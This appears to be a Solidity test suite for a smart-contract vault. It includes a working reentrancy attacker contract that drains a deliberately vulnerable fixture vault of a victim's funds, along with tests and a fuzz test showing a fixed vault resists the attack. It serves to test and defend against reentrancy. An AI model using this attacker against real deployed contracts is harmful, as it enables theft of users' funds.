// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "fixture/VulnerableVault.sol";
import "../src/FixedVault.sol";

interface Vm {
    function deal(address, uint256) external;
    function prank(address) external;
}
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrantAttacker {
    IVault public vault;
    uint256 public rounds;
    uint256 private remaining;
    constructor(address target) { vault = IVault(target); }
    function attack(uint256 deposit, uint256 callbacks) external payable {
        remaining = callbacks;
        vault.deposit{value: deposit}();
        vault.withdraw();
    }
    receive() external payable {
        rounds++;
        if (remaining > 0) {
            remaining--;
            // The fixed vault rejects this reentry. Keep the outer transfer alive.
            (bool ok,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
            if (!ok) { remaining = 0; }
        }
    }
}

contract RejectingRecipient {
    function deposit(IVault vault) external payable { vault.deposit{value: msg.value}(); }
    function withdraw(IVault vault) external returns (bool) {
        (bool ok,) = address(vault).call(abi.encodeWithSignature("withdraw()"));
        return ok;
    }
    receive() external payable { revert("reject transfer"); }
}

contract VaultRiskTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    address private constant victim = address(0xBEEF);
    receive() external payable {}

    function test_ReentrancyDrainsVictimFunds() public {
        VulnerableVault vault = new VulnerableVault();
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        vm.deal(address(this), 1 ether);
        ReentrantAttacker attacker = new ReentrantAttacker(address(vault));
        attacker.attack{value: 1 ether}(1 ether, 5);
        require(address(vault).balance == 0, "vault was not drained");
        require(address(attacker).balance == 6 ether, "attacker did not receive victim funds");
        require(vault.balances(victim) == 5 ether, "victim liability changed");
        require(attacker.rounds() == 6, "unexpected callback count");
    }

    function test_FixedVaultBlocksSameAttack() public {
        FixedVault vault = new FixedVault();
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        vm.deal(address(this), 1 ether);
        ReentrantAttacker attacker = new ReentrantAttacker(address(vault));
        attacker.attack{value: 1 ether}(1 ether, 5);
        require(address(vault).balance == 5 ether, "victim funds lost");
        require(address(attacker).balance == 1 ether, "attacker received excess funds");
        require(vault.balances(victim) == 5 ether, "victim credit changed");
    }

    function test_FailedTransferRestoresCredit() public {
        FixedVault vault = new FixedVault();
        RejectingRecipient recipient = new RejectingRecipient();
        vm.deal(address(this), 1 ether);
        recipient.deposit{value: 1 ether}(IVault(address(vault)));
        require(!recipient.withdraw(IVault(address(vault))), "withdrawal should revert");
        require(vault.balances(address(recipient)) == 1 ether, "credit was not restored");
        require(address(vault).balance == 1 ether, "vault funds changed");
    }

    function testFuzz_FixedVaultPreservesVictimFunds(uint96 rawAmount, uint8 rawRounds) public {
        uint256 amount = uint256(rawAmount) % 10 ether + 1;
        uint256 callbacks = uint256(rawRounds) % 16 + 1;
        FixedVault vault = new FixedVault();
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        vm.deal(address(this), amount);
        ReentrantAttacker attacker = new ReentrantAttacker(address(vault));
        attacker.attack{value: amount}(amount, callbacks);
        require(address(vault).balance == 5 ether, "victim funds lost");
        require(address(attacker).balance == amount, "attacker received excess funds");
        require(vault.balances(victim) == 5 ether, "victim credit changed");
    }
}
